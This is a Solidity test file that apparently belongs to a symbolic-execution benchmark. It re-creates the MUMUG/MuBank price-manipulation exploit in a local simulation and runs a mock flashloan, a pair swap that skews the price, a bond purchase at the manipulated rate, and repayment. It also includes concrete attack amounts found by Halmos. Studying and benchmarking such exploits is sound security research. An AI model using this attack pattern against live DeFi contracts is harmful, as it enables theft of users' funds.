// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@utils/ERC20Basic.sol";
import "@utils/USDCE.sol";
import "@utils/QueryBlockchain.sol";

import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

import "benchmarks/realworld/MUMUG/MuBank.sol";

contract MUMUGTest is Test, BlockLoader {
    MuBank bank;
    ERC20Basic mu;
    USDCE usdc_e;
    // USDCE to MU
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;

    // Dont change the address of owner.
    address constant owner = address(0x123456);

    // Load from cheats.createSelectFork("Avalanche", 23435294);
    uint256 totalSupplyUSDCE = 193102891951559;
    uint256 totalSupplyMU = 2000000 ether;

    uint112 reserve0 = 110596398651;
    uint112 reserve1 = 172739951491310439336991;
    uint32 blockTimestampLast = 1670632626;
    uint256 kLast = 19102449214934407600169207587014640;
    uint256 price0CumulativeLast =
        308814746138342549066779453499621908384171319637193787;
    uint256 price1CumulativeLast = 108977737583418847522328147893;

    uint256 pairBalance0 = 110596398651;
    uint256 pairBalance1 = 172739951491310439336991;

    uint256 bankBalanceMU = 100000 ether;

    function setUp() public {
        vm.startPrank(owner);

        // Initialize Tokens
        // Dont change the order of contract initialization
        mu = new ERC20Basic(totalSupplyMU);
        usdc_e = new USDCE();

        emit log_named_address("USDC Address", address(usdc_e));
        emit log_named_address("MU Address", address(mu));
        emit log_string("");

        // Initialize Uniswap
        pair = new UniswapV2Pair(
            address(usdc_e),
            address(mu),
            reserve0,
            reserve1,
            blockTimestampLast,
            kLast,
            price0CumulativeLast,
            price1CumulativeLast
        );
        usdc_e.transfer(address(pair), pairBalance0);
        mu.transfer(address(pair), pairBalance1);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        router = new UniswapV2Router(address(factory), address(0xdead));

        // Initialize Bank
        bank = new MuBank(address(router), address(pair), address(mu));
        mu.transfer(address(bank), bankBalanceMU);

        // Mock flashloan
        mu.approve(self(), UINT256_MAX);
        usdc_e.approve(self(), UINT256_MAX);

        vm.stopPrank();

        // Unsupported by halmos
        // vm.label(address(bank), "Bank");
        // vm.label(address(mu), "MU");
        // vm.label(address(usdc_e), "USDCE");
        // vm.label(address(router), "Router");
        // vm.label(address(pair), "Pair");
    }

    function self() public view returns (address) {
        return address(this);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        address attacker = self();
        address pair_ = address(pair);
        address bank_ = address(bank);
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(address(usdc_e), attacker, usdc_e.decimals());
        queryERC20BalanceDecimals(address(mu), attacker, mu.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(address(usdc_e), pair_, usdc_e.decimals());
        queryERC20BalanceDecimals(address(mu), pair_, mu.decimals());
        emit log_string("");
        emit log_string("Bank Balances: ");
        queryERC20BalanceDecimals(address(usdc_e), bank_, usdc_e.decimals());
        queryERC20BalanceDecimals(address(mu), bank_, mu.decimals());
        emit log_string("");
        emit log_string("");
    }

    function borrow_ERC20Basic(uint256 amount) internal {
        mu.transferFrom(owner, self(), amount);
    }

    function flashLoanPayback(uint256 amount) internal {
        mu.transfer(owner, amount);
    }

    function swapUSDCToMUByPair(uint256 sendAmount) internal {
        usdc_e.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdc_e);
        path[1] = address(mu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sendAmount,
            1,
            path,
            self(),
            block.timestamp
        );
    }

    function swapMUToUSDCByPair(uint256 sendAmount) internal {
        mu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(mu);
        path[1] = address(usdc_e);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sendAmount,
            1,
            path,
            self(),
            block.timestamp
        );
    }

    function swapUSDCToMUByBank(uint256 sendAmount) internal {
        usdc_e.approve(address(bank), type(uint).max);
        bank.mu_bond(address(usdc_e), sendAmount);
    }

    function attackGoal() public view returns (bool) {
        return usdc_e.balanceOf(self()) >= 10e6;
    }

    function attackTemp(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        // This attack is different from the original one:
        // https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/MUMUG_exp.sol
        // I de-couple two attacks from it.
        printBalance("Before exploit: ");

        // Step 1, mock to flashloan MU.
        borrow_ERC20Basic(amt0);

        printBalance("After flashloan: ");

        // Step 2, swap MU to USDCE at uniswapPair, it will manipulate the price of MU/USDCE in MU bank.
        swapMUToUSDCByPair(amt1);

        printBalance("After swap1: ");

        // Step 3, do the manipulated sell of MU.
        swapUSDCToMUByBank(amt2);

        printBalance("After swap2: ");

        require(mu.balanceOf(self()) > amt3);

        // Step 4, payback the flashloan.
        flashLoanPayback(amt3);

        printBalance("After exploit: ");
    }

    function test_gt() public {
        uint256 flashloanAmt = (mu.balanceOf(address(bank)) * 990) / 1000;
        uint256 swapAmt = flashloanAmt;
        uint256 sendAmt = 22980 ether;
        uint256 paybackAmt = flashloanAmt + 300 ether;
        attackTemp(flashloanAmt, swapAmt, sendAmt, paybackAmt);
        require(attackGoal(), "Attack failed!");
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.assume(amt0 == amt1);
        vm.assume(amt3 == amt0 + 300 ether);
        vm.assume(amt0 > 0);
        vm.assume(amt1 > 0);
        vm.assume(amt2 > 0);
        vm.assume(amt3 > 0);
        attackTemp(amt0, amt1, amt2, amt3);
        assert(!attackGoal());
    }

    function test_halmos_gt() public {
        attackTemp(
            0xc0fce9b8623f93873e2,
            0xc0fce9b8623f93873e2,
            0x4d2053fdf95000053e0,
            0xc2011f1a0ac226873e2
        );
        require(attackGoal(), "Attack failed!");
    }
}
